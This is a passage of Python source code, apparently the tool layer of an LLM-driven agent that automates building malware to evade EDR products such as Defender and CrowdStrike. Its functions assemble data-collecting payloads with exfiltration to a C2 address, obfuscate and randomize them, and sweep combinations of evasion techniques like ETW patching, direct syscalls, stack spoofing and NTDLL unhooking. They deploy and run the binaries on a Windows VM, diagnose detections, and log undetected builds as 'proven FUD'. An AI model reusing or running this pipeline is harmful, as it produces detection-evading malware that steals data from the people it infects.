            proven = db.get_proven_for(edr, malware_type)
            failed = db.get_failed_for(edr, malware_type)
            lines.append(f"\nProven recipes ({len(proven)}):")
            for p in proven:
                lines.append(f"  - {p}")
            lines.append(f"\nFailed patterns ({len(failed)}):")
            for fp in failed:
                lines.append(f"  - {fp}")
            rate_c = db.get_success_rate(edr, "c")
            rate_js = db.get_success_rate(edr, "jscript")
            lines.append(f"\nSuccess rates: PE={rate_c:.0%}, JScript={rate_js:.0%}")
        else:
            lines.append(f"\n{db.summary()}")

        return "\n".join(lines)

    # ── Sweep & Analysis ──────────────────────────────────────────────

    async def tool_sweep_matrix(self, recipe: str, dimensions: list[str] | None = None) -> str:
        """Enumerate variant combinations for a recipe and report coverage."""
        import yaml as _yaml
        import itertools

        variants_path = Path(self.chunks_dir) / "variants.yaml"
        if not variants_path.exists():
            return "ERROR: variants.yaml not found"
        with open(variants_path) as f:
            vdata = _yaml.safe_load(f)
        groups = vdata.get("groups", {})

        default_dims = ["api_resolution", "syscall_gate", "sleep_obfuscation",
                        "stack_spoofing", "etw_bypass", "ntdll_restore"]
        dims = dimensions or default_dims
        dim_members = {}
        for d in dims:
            if d in groups:
                dim_members[d] = groups[d]
            else:
                dim_members[d] = [f"(no group '{d}')"]

        total_combos = 1
        for members in dim_members.values():
            total_combos *= len(members)

        recipe_history = self._load_recipe_results()
        tested_keys = set()
        for rname, results in recipe_history.items():
            for r in results:
                key = r.get("evasion_combo", "")
                if key:
                    tested_keys.add(key)

        lines = [
            f"=== Sweep Matrix for '{recipe}' ===",
            f"Dimensions: {len(dims)}",
        ]
        for d, members in dim_members.items():
            lines.append(f"  {d}: {len(members)} variants")
        lines.append(f"Total combinations: {total_combos:,}")
        lines.append(f"Previously tested combos: {len(tested_keys)}")
        lines.append(f"Untested: {max(0, total_combos - len(tested_keys)):,}")

        lines.append("\n--- Suggested next 5 untried combos ---")
        count = 0
        for combo in itertools.product(*dim_members.values()):
            key = "|".join(combo)
            if key not in tested_keys:
                short = [c.split("/")[-1] for c in combo]
                lines.append(f"  {count+1}. {' + '.join(short)}")
                count += 1
                if count >= 5:
                    break

        if count == 0:
            lines.append("  (all combinations tested!)")

        return "\n".join(lines)

    async def tool_analyze_detection(self, verdict: str, binary_exists: bool,
                                      c2_bytes: int, defender_detections: list[str] | None = None,
                                      cs_detections: list[str] | None = None,
                                      evasion_chunks: list[str] | None = None) -> str:
        """Structured analysis of which evasion layer likely failed."""
        defender_detections = defender_detections or []
        cs_detections = cs_detections or []
        evasion_chunks = evasion_chunks or []

        lines = ["=== Detection Analysis ==="]

        if verdict == "SUCCESS" and binary_exists and not defender_detections and not cs_detections:
            lines.append("Result: CLEAN PASS — no detection on any layer")
            lines.append("Recommendation: Record this combination as proven FUD")
            return "\n".join(lines)

        if not binary_exists and c2_bytes == 0:
            lines.append("Detection type: STATIC (pre-execution quarantine)")
            lines.append("The binary was removed before it could run.")
            lines.append("\nLikely failed layers:")
            lines.append("  - PE structure (imports, entropy, rich header, resources)")
            lines.append("  - ML scoring (section names, import table hash)")
            lines.append("\nRecommendation: Change api_resolution variant (different IAT),")
            lines.append("  add/change entropy_pad, ensure resources=true,")
            lines.append("  try a completely different recipe format (JScript)")

        elif not binary_exists and c2_bytes > 0:
            lines.append("Detection type: BEHAVIORAL (post-execution removal)")
            lines.append(f"Payload ran ({c2_bytes} bytes exfiltrated) but EDR killed it.")
            lines.append("\nLikely failed layers:")
            has_sleep = any("sleep" in c for c in evasion_chunks)
            has_etw = any("etw" in c for c in evasion_chunks)
            has_syscall = any("syscall" in c or "gate" in c for c in evasion_chunks)
            has_stack = any("stack" in c or "ret_spoof" in c for c in evasion_chunks)
            has_unhook = any("unhook" in c for c in evasion_chunks)

            if not has_etw:
                lines.append("  - ETW telemetry NOT blinded (add etw_patch/etw_full_patch)")
            if not has_syscall:
                lines.append("  - Direct NT syscalls NOT used (add hells_gate/tartarus_gate)")
            if not has_stack:
                lines.append("  - Call stack NOT spoofed (add stack_spoof/ret_spoof)")
            if not has_sleep:
                lines.append("  - Sleep NOT obfuscated (add sleep_ekko/sleep_foliage)")
            if not has_unhook:
                lines.append("  - NTDLL hooks NOT removed (add unhook_ntdll/unhook_knowndlls)")
            if has_etw and has_syscall and has_stack:
                lines.append("  - All major layers present — try different VARIANTS of each")

            lines.append("\nRecommendation: Swap the weakest evasion layer variant first,")
            lines.append("  then test. Prioritize: ETW > syscall > stack > sleep > unhook")

        elif binary_exists and c2_bytes == 0:
            lines.append("Detection type: NONE (runtime failure, not detection)")
            lines.append("Binary survived but no C2 data. Likely a crash or network issue.")
            lines.append("\nRecommendation: Check C2 listener was running, verify IP/port,")
            lines.append("  test with simpler recipe first to isolate the failure")

        else:
            lines.append(f"Detection type: PARTIAL (binary exists={binary_exists}, c2={c2_bytes}B)")
            if defender_detections:
                lines.append(f"\nDefender detections ({len(defender_detections)}):")
                for d in defender_detections[:3]:
                    lines.append(f"  {d}")
            if cs_detections:
                lines.append(f"\nCrowdStrike detections ({len(cs_detections)}):")
                for d in cs_detections[:3]:
                    lines.append(f"  {d}")

        if evasion_chunks:
            lines.append(f"\nCurrent evasion stack ({len(evasion_chunks)}):")
            for c in evasion_chunks:
                lines.append(f"  - {c}")

        return "\n".join(lines)

    # ── Building ─────────────────────────────────────────────────────

    async def tool_assemble(self, recipe: str, compile: bool = True,
                            vars: dict | None = None,
                            randomize: bool = False,
                            obfuscation: str = "light",
                            compiler: str = "mingw",
                            count: int = 1,
                            delivery: list[str] | None = None) -> str:
        count = max(1, min(count, 10))
        edr = self.config.get("edr", "none").lower()
        if edr != "none":
            if not randomize:
                logger.info("EDR target (%s): forcing randomize=True", edr)
                randomize = True
            if obfuscation == "none":
                logger.info("EDR target (%s): forcing obfuscation=light", edr)
                obfuscation = "light"

        if count > 1:
            import time
            results = []
            for i in range(count):
                r = await self.tool_assemble(
                    recipe=recipe, compile=compile, vars=vars,
                    randomize=randomize, obfuscation=obfuscation,
                    compiler=compiler, count=1, delivery=delivery,
                )
                results.append(f"--- Variant {i+1}/{count} ---\n{r}")
                if i < count - 1:
                    time.sleep(1)
            return self._truncate("\n\n".join(results), 3000, "assemble")

        logger.info("Assembling recipe: %s (compile=%s, randomize=%s, obfuscation=%s)",
                     recipe, compile, randomize, obfuscation)
        self._last_recipe = recipe.replace(".yaml", "")
        self._last_assembled_recipe = self._last_recipe
        self._quarantine_streak = 0
        self._quarantine_locked = False

        recipe_name = recipe.replace(".yaml", "")
        if self._blind_mode and recipe_name in self._blind_name_map:
            recipe_name = self._blind_name_map[recipe_name]
        recipe_file = f"{recipe_name}.yaml"
        recipe_path = Path(self.recipes_dir) / recipe_file
        if not recipe_path.exists():
            return f"ERROR: Recipe not found: {recipe_path}"

        with open(recipe_path) as f:
            recipe_data = yaml.safe_load(f)

        # Warn (but don't block) if recipe doesn't match target malware type
        target_type = self.config.get("_target_malware_type", "")
        if target_type:
            recipe_lower = recipe.lower()
            type_match = any(t in recipe_lower for t in (target_type, target_type[:5]))
            if not type_match and not any(t in recipe_lower for t in ("cs_pe", "edr", "full", "staged", "stealth", "proven")):
                logger.warning("Recipe %s may not match target type '%s'", recipe, target_type)
                return (f"WARNING: Recipe '{recipe}' does not appear to be a {target_type}. "
                        f"The user selected malware type '{target_type}'. "
                        f"Use a {target_type} recipe instead, or call list_recipes to find one.")

        target_format = self.config.get("_target_format", "")
        recipe_fmt = recipe_data.get("format", "")
        script_formats = {"jscript", "vbscript", "batch"}
        if target_format and target_format not in ("auto", ""):
            fmt_mismatch = False
            if target_format in script_formats:
                fmt_mismatch = recipe_fmt != target_format
            elif target_format in ("pe", "c"):
                fmt_mismatch = recipe_fmt in script_formats
            if fmt_mismatch:
                return (f"ERROR: Recipe '{recipe}' is format '{recipe_fmt or 'pe'}' "
                        f"but the user required format '{target_format}'. "
                        f"Call list_recipes(format_filter=\"{target_format}\") to find matching recipes.")

        self._last_exfil = recipe_data.get("exfil", "")
        is_jscript = recipe_data.get("format") == "jscript" or recipe.startswith("js_")
        wants_obfuscation = (not is_jscript
                             and obfuscation
                             and obfuscation != "none")

        recipe_key = recipe.replace(".yaml", "")
        if wants_obfuscation and (recipe_key, obfuscation) in self._failed_obfusc:
            logger.info("Skipping obfuscation=%s for %s (previously failed compilation)", obfuscation, recipe_key)
            wants_obfuscation = False
            obfuscation = "none"

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        malware_type = recipe_data.get("name", recipe).split("_")[0]
        result_dir = Path(self.results_dir) / f"chunk_{malware_type}_{ts}"
        result_dir.mkdir(parents=True, exist_ok=True)
        self._last_output_dir = str(result_dir)

        ext = ".js" if is_jscript else ".c"
        output_source = str(result_dir / f"source{ext}")

        cmd = [
            "python3", self.assembler_path,
            str(recipe_path),
            "-o", output_source,
        ]
        if compile and not is_jscript and not wants_obfuscation:
            cmd.append("--compile")
            if compiler and compiler != "mingw":
                cmd.extend(["--compiler", compiler])
        if randomize:
            cmd.append("--randomize")

        merged_vars = dict(recipe_data.get("vars", {}))
        if vars:
            merged_vars.update(vars)
        for k, v in merged_vars.items():
            cmd.extend(["--var", f"{k}={v}"])

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            return "ERROR: Assembly timed out after 120s"

        out = stdout.decode("utf-8", errors="replace")
        err = stderr.decode("utf-8", errors="replace")

        if proc.returncode != 0:
            import re
            chunk_miss = re.search(r"Chunk not found: (\S+)", err)
            if chunk_miss:
                bad_chunk = chunk_miss.group(1)
                detail = (f"ERROR: Chunk '{bad_chunk}' does not exist. "
                          f"Use list_chunks to see valid chunk names — do NOT guess. "
                          f"Fix the recipe (mutate_recipe with remove_evasion=['{bad_chunk}']) "
                          f"and replace with a real chunk from list_chunks output.")
            else:
                detail = f"ERROR: Assembly failed (rc={proc.returncode})\nstdout: {out[:500]}\nstderr: {err[:500]}"
            self._epoch_failures.append(
                f"Assembly failed for {recipe_key}: {err[:200] if err else out[:200]}")
            return detail

        obfusc_note = ""
        pre_obfusc_source = None
        if wants_obfuscation and os.path.exists(output_source):
            try:
                from templates.chunks.obfuscate import obfuscate as _obfuscate
                with open(output_source, "r") as sf:
                    pre_obfusc_source = sf.read()
                obfuscated = _obfuscate(pre_obfusc_source, level=obfuscation)
                with open(output_source, "w") as sf:
                    sf.write(obfuscated)
                obfusc_note = f"\nObfuscation applied: {obfuscation}"
            except Exception as e:
                obfusc_note = f"\nObfuscation skipped ({obfuscation}): {e}"
                logger.warning("Obfuscation failed: %s", e)
                pre_obfusc_source = None

        if wants_obfuscation and compile:
            from templates.chunks.assembler import compile_mingw, compile_zig, build_resource
            _compile_fn = compile_zig if compiler == "zig" else compile_mingw
            exe_out = str(result_dir / "payload.exe")
            res_obj = build_resource(recipe_data, merged_vars, str(result_dir))
            ok = _compile_fn(output_source, exe_out, resource_obj=res_obj)
            if not ok and pre_obfusc_source:
                logger.warning("Obfuscation broke compilation — retrying without obfuscation")
                with open(output_source, "w") as sf:
                    sf.write(pre_obfusc_source)
                ok = _compile_fn(output_source, exe_out, resource_obj=res_obj)
                if ok:
                    obfusc_note = f"\nObfuscation={obfuscation} broke compilation — compiled WITHOUT obfuscation (binary still randomized)"
                    self._failed_obfusc.add((recipe_key, obfuscation))
                else:
                    self._failed_obfusc.add((recipe_key, obfuscation))
                    return (f"ERROR: Compilation failed even without obfuscation\n{out}")
            elif not ok:
                self._failed_obfusc.add((recipe_key, obfuscation))
                return (f"ERROR: Compilation failed after obfuscation={obfuscation} "
                        f"(recorded — this combo will be auto-skipped next time){obfusc_note}\n{out}")

        import shutil
        shutil.copy2(str(recipe_path), str(result_dir / "recipe.yaml"))

        exe_path = str(result_dir / "payload.exe")
        # Assembler with --compile names output after the source file; rename to payload.exe
        for candidate in result_dir.glob("*.exe"):
            if candidate.name != "payload.exe":
                candidate.rename(result_dir / "payload.exe")
                break
        for candidate in result_dir.glob("*.dll"):
            if candidate.name != "payload.dll":
                candidate.rename(result_dir / "payload.dll")
                break
        for candidate in result_dir.glob("*.cpl"):
            if candidate.name != "payload.cpl":
                candidate.rename(result_dir / "payload.cpl")
                break

        binary = None
        for ext_check in ("payload.exe", "payload.dll", "payload.cpl"):
            p = result_dir / ext_check
            if p.exists():
                binary = p
                break

        build_info = (
            f"type: {malware_type}\n"
            f"recipe: {recipe}\n"
            f"format: {'jscript' if is_jscript else 'pe'}\n"
            f"obfuscation: {obfuscation}\n"
            f"binary_size: {binary.stat().st_size if binary else 0}\n"
            f"evasion: {', '.join(recipe_data.get('evasion', []))}\n"
            f"api_resolve: {recipe_data.get('api_resolve', 'none')}\n"
            f"resources: {recipe_data.get('resources', False)}\n"
            f"date: {ts}\n"
        )
        (result_dir / "build_info.txt").write_text(build_info)

        # Copy deploy script template
        deploy_template = Path(__file__).parent.parent / "scripts" / "deploy_template.py"
        if deploy_template.exists():
            deploy_script = result_dir / "deploy.py"
            payload_name = binary.name if binary else (os.path.basename(output_source) if is_jscript else "payload.exe")
            payload_type = "jscript" if is_jscript else "pe"
            content = deploy_template.read_text()
            content = content.replace("{{PAYLOAD_NAME}}", payload_name)
            content = content.replace("{{PAYLOAD_TYPE}}", payload_type)
            deploy_script.write_text(content)

        # Generate delivery packages if requested
        delivery_note = ""
        if delivery and (binary or is_jscript):
            try:
                from templates.chunks.delivery import package as delivery_package
                payload_path = str(binary) if binary else output_source
                results = delivery_package(payload_path, str(result_dir), methods=delivery)
                success_pkgs = [m for m, r in results.items() if r.success]
                fail_pkgs = [(m, r.error) for m, r in results.items() if not r.success]
                if success_pkgs:
                    delivery_note = f"\nDelivery packages: {', '.join(success_pkgs)}"
                if fail_pkgs:
                    delivery_note += f"\nDelivery failures: {', '.join(f'{m}: {e}' for m, e in fail_pkgs)}"
            except Exception as e:
                delivery_note = f"\nDelivery packaging failed: {e}"
                logger.warning("Delivery packaging failed: %s", e)

        symlink = Path(self.results_dir) / "latest"
        if symlink.is_symlink():
            symlink.unlink()
        symlink.symlink_to(result_dir.name)

        output_files = list(result_dir.iterdir())
        output_summary = ", ".join(f.name for f in output_files)
        recipe_key = recipe.replace(".yaml", "")
        origin = self.get_recipe_origin(recipe_key)

        if not is_jscript and compile and binary:
            size = binary.stat().st_size
            return (f"Assembled and compiled: {binary} ({size} bytes)\n"
                    f"Output dir: {result_dir}\n"
                    f"Files: {output_summary}\n"
                    f"Recipe origin: {origin}\n{out}{obfusc_note}{delivery_note}")

        if is_jscript:
            size = os.path.getsize(output_source) if os.path.exists(output_source) else 0
            return (f"Assembled JScript: {output_source} ({size} bytes)\n"
                    f"Output dir: {result_dir}\n"
                    f"Files: {output_summary}\n"
                    f"Recipe origin: {origin}\n{out}{delivery_note}")

        return (f"Assembled source: {output_source}\n"
                f"Output dir: {result_dir}\n"
                f"Files: {output_summary}\n"
                f"Recipe origin: {origin}\n{out}\n{err}{obfusc_note}{delivery_note}")

    async def tool_create_recipe(
        self,
        name: str,
        format_type: str,
        collectors: list[str],
        exfil: str,
        arch: str,
        evasion: list[str] | None = None,
        api_resolve: str | None = None,
        vars: dict | None = None,
        resources: bool = False,
        def_file: str | None = None,
    ) -> str:
        logger.info("Creating recipe: %s (format=%s)", name, format_type)

        format_errors = []
        missing_errors = []
        all_refs = collectors + [exfil, arch] + (evasion or []) + ([api_resolve] if api_resolve else [])
        for ref in all_refs:
            if "/" not in ref:
                format_errors.append(ref)
            else:
                chunk_path = Path(self.chunks_dir) / ref
                fmt_prefixes = {"jscript": "jscript", "vbscript": "vbscript", "batch": "batch"}
                fmt_dir = fmt_prefixes.get(format_type, "")
                fmt_chunk_path = Path(self.chunks_dir) / fmt_dir / ref if fmt_dir else None
                found = False
                for p in [chunk_path, fmt_chunk_path]:
                    if p and any(p.with_suffix(s).exists() for s in (".c", ".h", ".js", ".vbs", ".bat")):
                        found = True
                        break
                if not found:
                    missing_errors.append(ref)
        if format_errors:
            return (f"ERROR: Chunk references must use 'category/name' format.\n"
                    f"Bad references: {', '.join(format_errors)}\n"
                    f"Example: use 'evasion/stack_spoof' not 'stack_spoof', "
                    f"'collectors/system_info' not 'system_info'.")
        if missing_errors:
            suggestions = {}
            for bad_ref in missing_errors:
                cat, chunk_name = bad_ref.split("/", 1) if "/" in bad_ref else ("", bad_ref)
                search_dirs = []
                if cat:
                    search_dirs.append(Path(self.chunks_dir) / cat)
                    fmt_prefix = {"jscript": "jscript", "vbscript": "vbscript", "batch": "batch"}.get(format_type)
                    if fmt_prefix:
                        search_dirs.append(Path(self.chunks_dir) / fmt_prefix / cat)
                available = []
                for cat_path in search_dirs:
                    if cat_path.is_dir():
                        available.extend(f.stem for f in cat_path.iterdir()
                                         if f.is_file() and f.suffix in (".c", ".h", ".js", ".vbs", ".bat"))
                available = sorted(set(available))
                if available:
                    matches = [a for a in available if chunk_name in a or a in chunk_name
                               or chunk_name.replace("_", "") == a.replace("_", "")]
                    if not matches:
                        matches = sorted(available, key=lambda a: sum(
                            1 for c in chunk_name if c in a))[-3:]
                    if matches:
                        suggestions[bad_ref] = [f"{cat}/{m}" for m in matches[:3]]
            hint_lines = []
            for bad, suggs in suggestions.items():
                hint_lines.append(f"  {bad} → did you mean: {', '.join(suggs)}?")
            return (f"ERROR: Chunks not found on disk: {', '.join(missing_errors)}\n"
                    + ("\n".join(hint_lines) + "\n" if hint_lines else "")
                    + "Use list_chunks with the correct category to see available chunks.\n"
                    + "TIP: Use an EXISTING recipe with assemble(randomize=True) instead of creating from scratch.")

        recipe = {
            "name": name,
            "description": f"Auto-generated recipe by Hermes ({format_type})",
        }
        if format_type in ("jscript", "vbscript", "batch"):
            recipe["format"] = format_type

        recipe["core"] = ["core/emit_buffer", "core/run_cmd", "core/file_ops"]
        recipe["collectors"] = collectors
        recipe["exfil"] = exfil
        recipe["arch"] = arch

        if def_file:
            recipe["def_file"] = def_file

        if resources and format_type != "jscript":
            recipe["resources"] = True

        if api_resolve:
            recipe["api_resolve"] = api_resolve

        recipe["evasion"] = evasion or []
        recipe["vars"] = vars or {"C2_IP": "10.0.2.2", "C2_PORT": "9001"}

        out_path = Path(self.recipes_dir) / f"{name}.yaml"
        with open(out_path, "w") as f:
            yaml.dump(recipe, f, default_flow_style=False, sort_keys=False)

        self._last_recipe = name
        self._last_exfil = exfil
        logger.info("Set _last_recipe=%s, _last_exfil=%s from create_recipe", name, exfil)

        self._recipe_lineage[name] = {
            "original_parent": name,
            "mutation_depth": 0,
            "created_new": True,
        }

        return f"Created recipe: {out_path}\nOrigin: NEW — created from scratch during this campaign"

    async def tool_mutate_recipe(
        self,
        recipe: str,
        add_evasion: list[str] | None = None,
        remove_evasion: list[str] | None = None,
        swap_exfil: str | None = None,
        swap_arch: str | None = None,
        swap_api_resolve: str | None = None,
        set_resources: bool | None = None,
        new_name: str | None = None,
    ) -> str:
        recipe_name = recipe.replace(".yaml", "")
        if self._blind_mode and recipe_name in self._blind_name_map:
            recipe_name = self._blind_name_map[recipe_name]
        recipe_file = f"{recipe_name}.yaml"
        recipe_path = Path(self.recipes_dir) / recipe_file
        if not recipe_path.exists():
            return f"ERROR: Recipe not found: {recipe_path}"

        with open(recipe_path) as f:
            data = yaml.safe_load(f)

        changes = []

        if add_evasion:
            existing = data.get("evasion", [])
            for e in add_evasion:
                if e not in existing:
                    existing.append(e)
                    changes.append(f"added evasion: {e}")
            data["evasion"] = existing

        if remove_evasion:
            existing = data.get("evasion", [])
            for e in remove_evasion:
                if e in existing:
                    existing.remove(e)
                    changes.append(f"removed evasion: {e}")
            data["evasion"] = existing

        if swap_exfil:
            data["exfil"] = swap_exfil
            changes.append(f"swapped exfil -> {swap_exfil}")

        if swap_arch:
            data["arch"] = swap_arch
            changes.append(f"swapped arch -> {swap_arch}")

        if swap_api_resolve:
            data["api_resolve"] = swap_api_resolve
            changes.append(f"swapped api_resolve -> {swap_api_resolve}")

        if set_resources is not None:
            data["resources"] = set_resources
            changes.append(f"resources = {set_resources}")

        out_name = new_name or f"{recipe}_mutated"
        data["name"] = out_name
        out_path = Path(self.recipes_dir) / f"{out_name}.yaml"

        with open(out_path, "w") as f:
            yaml.dump(data, f, default_flow_style=False, sort_keys=False)

        self._last_recipe = out_name
        self._last_exfil = data.get("exfil", "")
        logger.info("Set _last_recipe=%s, _last_exfil=%s from mutate_recipe", out_name, self._last_exfil)

        parent_key = recipe.replace(".yaml", "")
        parent_lineage = self._recipe_lineage.get(parent_key, {})
        original_parent = parent_lineage.get("original_parent", parent_key)
        depth = parent_lineage.get("mutation_depth", 0) + 1
        self._recipe_lineage[out_name] = {
            "original_parent": original_parent,
            "mutation_depth": depth,
            "created_new": False,
        }

        origin = self.get_recipe_origin(out_name)
        return f"Mutated recipe -> {out_path}\nChanges: {'; '.join(changes)}\nOrigin: {origin}"

    # ── Deployment ───────────────────────────────────────────────────

    async def tool_deploy_to_vm(
        self,
        local_path: str,
        remote_filename: str | None = None,
        execute: bool = False,
        execute_via: str = "direct",
    ) -> str:
        if not os.path.exists(local_path):
            return f"ERROR: Local file not found: {local_path}"

        import hashlib
        with open(local_path, "rb") as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()

        if self._quarantine_streak >= 3:
            return (f"BLOCKED: {self._quarantine_streak} consecutive quarantines. "
                    f"Your current approach does not work against this EDR.\n"
                    f"You MUST call tool_create_recipe or tool_mutate_recipe with DIFFERENT chunks, "
                    f"then tool_assemble the new recipe BEFORE deploying again.\n"
                    f"Try: different api_resolve, different evasion chunks, or switch format to jscript.")

        if file_hash in self._quarantined_hashes:
            return (f"ERROR: This exact binary (sha256: {file_hash[:16]}...) was already quarantined.\n"
                    f"You MUST call tool_assemble with a DIFFERENT recipe before deploying again.\n"
                    f"Same bytes = same detection. Change: recipe, evasion chunks, obfuscation, or randomize=true.")

        local_size = os.path.getsize(local_path)
        filename = remote_filename or os.path.basename(local_path)
        deploy_dirs = [
            f"C:\\Users\\{self.vm_user}\\Desktop",
            f"C:\\Users\\{self.vm_user}\\AppData\\Local\\Temp",
        ]
        remote_path = None

        for deploy_dir in deploy_dirs:
            candidate = f"{deploy_dir}\\{filename}"
            sftp_dir = deploy_dir.replace("\\", "/")
            logger.info("Deploying %s (%d bytes, sha256=%s) -> VM:%s (execute=%s, via=%s)",
                         local_path, local_size, file_hash[:16], candidate, execute, execute_via)

            ok = await self._scp_to_vm(local_path, filename, remote_dir=sftp_dir)
            if not ok:
                logger.warning("SCP to %s failed, trying next path", deploy_dir)
                continue

            size_out, _, _ = await self._ssh_exec(
                f'powershell -Command "(Get-Item \'{candidate}\').Length"', timeout=10
            )
            remote_size = int(size_out.strip().replace("\r", "")) if size_out.strip().replace("\r", "").isdigit() else -1

            if remote_size == local_size:
                remote_path = candidate
                logger.info("Verified %d bytes at %s", remote_size, remote_path)
                break
            else:
                logger.warning("Size mismatch at %s (%d local vs %d remote) — EDR quarantine, trying next path",
                               deploy_dir, local_size, remote_size)

        if remote_path is None:
            self._quarantined_hashes.add(file_hash)
            self._quarantine_streak += 1
            self._quarantine_locked = True
            self._epoch_failures.append(
                f"Deploy quarantined: {self._last_recipe} (hash {file_hash[:16]}...)")
            streak_msg = (f"\nQuarantine streak: {self._quarantine_streak}/3. "
                          f"{'NEXT DEPLOY BLOCKED — must assemble new recipe first.' if self._quarantine_streak >= 3 else 'Change the binary before retrying.'}")
            detection_details = ""
            try:
                edr_report = await self.tool_list_edr_events(minutes=2)
                if edr_report and "(none)" not in edr_report[:200]:
                    detection_details = f"\n\n=== Detection Details ===\n{edr_report[:1500]}"
            except Exception:
                pass
            return (f"ERROR: File quarantined by EDR at ALL deploy paths (hash {file_hash[:16]}... recorded).\n"
                    f"  Tried: {', '.join(deploy_dirs)}\n"
                    f"  Local: {local_path} ({local_size} bytes)\n"
                    f"  VM commands are LOCKED until you assemble a new binary.\n"
                    f"  Call mutate_recipe or create_recipe with DIFFERENT evasion, then assemble."
                    f"{streak_msg}{detection_details}")

        self._quarantine_streak = 0
        desktop_path = f"C:\\Users\\{self.vm_user}\\Desktop\\{filename}"
        used_fallback = (remote_path != desktop_path)

        result_lines = [
            f"Deployed {filename} to VM ({remote_size} bytes verified)",
            f"  Remote path: {remote_path}",
        ]
        if used_fallback:
            result_lines.append(f"  NOTE: Desktop path was quarantined, deployed to fallback path instead")

        is_script = filename.lower().endswith((".js", ".vbs", ".bat"))
        for port, info in list(_c2_listeners.items()):
            active_proto = info.get("protocol", "tcp")
            if active_proto == "backdoor":
                pass  # never auto-convert a backdoor C2
            elif is_script and active_proto != "http":
                logger.info("Protocol mismatch: deploying %s but C2 on port %d is %s — restarting as HTTP",
                            filename, port, active_proto)
                await self._restart_c2_as(port, "http", info)
                result_lines.append(f"  Auto-fixed C2 protocol: {active_proto} -> HTTP (JScript/VBS requires HTTP)")
            elif not is_script and active_proto == "http" and not self._last_recipe.startswith(("js_", "vbs_")):
                if self._last_exfil and "http" not in self._last_exfil and not self._is_backdoor:
                    logger.info("Protocol mismatch: deploying PE %s but C2 on port %d is HTTP — restarting as TCP",
                                filename, port, active_proto)
                    await self._restart_c2_as(port, "tcp", info)
                    result_lines.append(f"  Auto-fixed C2 protocol: HTTP -> TCP (PE with non-HTTP exfil)")

        if execute:
            is_persistent = self._is_persistent_type
            if execute_via == "cscript":
                if is_persistent:
                    cmd = f'start /b cscript //nologo //E:jscript "{remote_path}"'
                    exec_timeout = 15
                else:
                    cmd = f'cscript //nologo //E:jscript "{remote_path}"'
                    exec_timeout = 90
            elif execute_via == "wscript":
                if is_persistent:
                    cmd = f'start /b wscript "{remote_path}"'
                    exec_timeout = 15
                else:
                    cmd = f'wscript "{remote_path}"'
                    exec_timeout = 90
            elif execute_via == "cmd":
                if is_persistent:
                    cmd = f'start /b "" "{remote_path}"'
                    exec_timeout = 15
                else:
                    cmd = f'"{remote_path}"'
                    exec_timeout = 90
            else:
                if is_persistent:
                    cmd = f'start /b "" "{remote_path}"'
                    exec_timeout = 15
                else:
                    cmd = f'"{remote_path}"'
                    exec_timeout = 90

            stdout, stderr, rc = await self._ssh_exec(cmd, timeout=exec_timeout)
            result_lines.append(f"Executed via {execute_via} (exit code: {rc})")
            if stdout.strip():
                result_lines.append(f"stdout: {stdout[:1000]}")
            if stderr.strip():
                result_lines.append(f"stderr: {stderr[:500]}")

            post_out, _, _ = await self._ssh_exec(
                f'powershell -Command "if(Test-Path \'{remote_path}\'){{\'EXISTS\'}}else{{\'GONE\'}}"',
                timeout=10,
            )
            status = post_out.strip().replace("\r", "")
            if status == "GONE":
                self._quarantined_hashes.add(file_hash)
                self._quarantine_streak += 1
                result_lines.append(
                    f"WARNING: Binary removed after execution (quarantined by EDR, streak: {self._quarantine_streak}). "
                    f"Assemble a DIFFERENT recipe with different evasion before retrying."
                )

        return "\n".join(result_lines)

    async def tool_read_file(self, path: str, max_lines: int = 100) -> str:
        """Read a file from the host filesystem (NOT the VM). Use for reading
        recipe YAML files, chunk source code, build_info.txt, etc."""
        logger.info("Reading host file: %s", path)
        project_root = Path(__file__).parent.parent
        target = Path(path)
        if not target.is_absolute():
            target = project_root / path
        if not target.exists():
            return f"ERROR: File not found: {target}"
        try:
            text = target.read_text(errors="replace")
            lines = text.splitlines()
            if len(lines) > max_lines:
                text = "\n".join(lines[:max_lines]) + f"\n... ({len(lines) - max_lines} more lines)"
            return self._truncate(text, 4000, "read_file")
        except Exception as e:
            return f"ERROR reading {target}: {e}"

    @staticmethod
    def _protocol_mismatches(protocol: str, exfil: str) -> bool:
        """Return True if the LLM-chosen protocol contradicts the recipe's exfil method."""
        if protocol == "http" and "tcp" in exfil and "http" not in exfil:
            return True
        if protocol == "tcp" and "http" in exfil and "tcp" not in exfil:
            return True
        return False

    async def _restart_c2_as(self, port: int, new_protocol: str, old_info: dict):
        """Shut down an active C2 listener and restart it with a different protocol."""
        stop_ev = _c2_stop_events.pop(port, None)
        if stop_ev:
            stop_ev.set()
        srv = _c2_servers.pop(port, None)
        if srv:
            try:
                if hasattr(srv, 'server_close'):
                    srv.server_close()
                elif hasattr(srv, 'close'):
                    srv.close()
            except Exception:
                pass
        _c2_listeners.pop(port, None)
        _c2_locks.pop(port, None)

        import subprocess
        subprocess.run(["fuser", "-k", f"{port}/tcp"], capture_output=True, timeout=5)
        await asyncio.sleep(1.0)

        _c2_locks[port] = threading.Lock()
        _c2_stop_events[port] = threading.Event()
        _c2_listeners[port] = {
            "data": b"",
            "requests": 0,
            "started": datetime.now().isoformat(),
            "protocol": new_protocol,
        }

        if new_protocol == "backdoor":
            target_fn = _run_backdoor_c2
        elif new_protocol == "tcp":
            target_fn = _run_tcp_c2
        else:
            target_fn = _run_http_c2
        t = threading.Thread(target=target_fn, args=(port, 120), daemon=True)
        t.start()
        await asyncio.sleep(1.0)

        if port not in _c2_servers:
            _c2_listeners.pop(port, None)
            _c2_locks.pop(port, None)
            _c2_stop_events.pop(port, None)
            logger.error("Failed to restart C2 as %s on port %d", new_protocol, port)
        else:
            logger.info("Restarted C2 listener: port %d now %s", port, new_protocol)

    async def tool_start_c2_listener(
        self, port: int = 9001, protocol: str = "auto", timeout: int = 120
    ) -> str:
        exfil = getattr(self, "_last_exfil", "")
        is_script_recipe = False
        if self._last_recipe:
            if self._last_recipe.startswith(("js_", "vbs_")):
                is_script_recipe = True
            else:
                recipe_path = Path(self.recipes_dir) / f"{self._last_recipe}.yaml"
                if recipe_path.exists():
                    try:
                        with open(recipe_path) as _rf:
                            _rd = yaml.safe_load(_rf)
                        if _rd and _rd.get("format") in ("jscript", "vbscript"):
                            is_script_recipe = True
                    except Exception:
                        pass
